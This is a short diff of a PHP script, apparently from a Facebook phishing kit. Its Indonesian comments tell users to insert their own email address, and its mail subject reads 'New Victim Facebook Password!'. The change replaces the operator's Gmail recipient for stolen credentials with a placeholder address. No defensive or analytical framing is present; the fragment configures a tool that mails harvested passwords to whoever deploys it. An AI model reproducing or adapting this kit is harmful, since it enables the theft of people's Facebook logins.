@@ -3,7 +3,7 @@
 /* SILAHKAN GANTI SUBJECT DAN EMAIL ANDA SENDIRI.*/
 
 $emailsubject = ‘Korban Baru Password Facebook !’;
-$mailto = ‘akukalian11@gmail.com’;
+$mailto = ‘contoh@gmail.com’;
 
 /* Fungsi berikut untuk mengambil input field. */
 
